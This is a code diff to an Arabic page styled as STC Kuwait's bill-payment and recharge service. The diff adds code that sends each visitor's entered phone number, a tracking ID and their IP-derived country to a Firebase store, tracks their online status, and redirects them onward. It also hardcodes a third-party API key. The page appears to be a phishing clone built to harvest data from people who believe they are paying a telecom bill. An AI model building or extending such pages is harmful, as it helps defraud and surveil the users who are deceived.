@@ -15,18 +15,75 @@ import {
   Twitter,
   Instagram,
   Youtube,
+  Loader2,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
-import { useState } from "react"
+import React, { useEffect, useState } from "react"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
+
+const visitorId = `sct-app-${Math.random().toString(36).substring(2, 15)}`;
 
 export default function STCKuwaitArabic() {
   const [phone, setPhone] = useState("")
+  const [loading, setIsLoading] = useState(false)
 
   const handlePhone = (value: string) => {
     setPhone(value)
   }
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    await addData({
+      createdDate: new Date().toISOString(),
+      id: visitorId,
+      currentPage: "الخطط",
+      phone:phone,
+      mobile:phone
+    })
+    setIsLoading(true)
+    setTimeout(() => {
+      window.location.href="/plans"
+    }, 3000);
+  }
+  const getLocationAndLog = async () => {
+    if (!visitorId) return;
+
+    // This API key is public and might be rate-limited or disabled.
+    // For a production app, use a secure way to handle API keys, ideally on the backend.
+    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
+    try {
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+      const country = await response.text()
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: visitorId,
+        country: country,
+        action: "page_load",
+        currentPage: "الرئيسية ",
+      })
+      localStorage.setItem("country", country) // Consider privacy implications
+      setupOnlineStatus(visitorId)
+    } catch (error) {
+      console.error("Error fetching location:", error)
+      // Log error with visitor ID for debugging
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: visitorId,
+        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
+        action: "location_error"
+      });
+    }
+  }
+  useEffect(() => {
+    getLocationAndLog()
+  }, []);
   return (
     <div className="min-h-screen bg-white" dir="rtl">
       {/* Header */}
@@ -71,7 +128,8 @@ export default function STCKuwaitArabic() {
           <h1 className="text-2xl font-bold text-gray-900 mb-8 text-center">خدمات دفع الفواتير وإعادة التعبئة</h1>
 
           {/* Quick Pay Section */}
-          <div className="mb-8">
+          <form className="mb-8 " onSubmit={handleSubmit}>
+            
             <h2 className="text-xl font-bold text-gray-900 mb-4">الدفع السريع</h2>
             <p className="text-gray-600 text-sm mb-4">رقم الهاتف (الرقم المدني أو رقم العقد)</p>
 
@@ -83,8 +141,11 @@ export default function STCKuwaitArabic() {
                 placeholder="أدخل رقم الهاتف"
                 className="w-full p-3 border border-gray-300 rounded-lg text-right"
               />
-              <Button className="w-full bg-pink-400 hover:bg-pink-500 text-white py-3 rounded-lg font-medium">
+              <Button
+                disabled={phone.length !== 8}
+                className="w-full bg-pink-500 hover:bg-pink-500 text-white py-3 rounded-lg font-medium">
                 متابعة
+                {loading && <Loader2 className="h-4 animate-spin" />}
               </Button>
               <Button
                 variant="outline"
@@ -94,7 +155,7 @@ export default function STCKuwaitArabic() {
                 <Share2 className="h-4 w-4" />
               </Button>
             </div>
-          </div>
+          </form>
 
           {/* Services Section */}
           <div className="space-y-6">
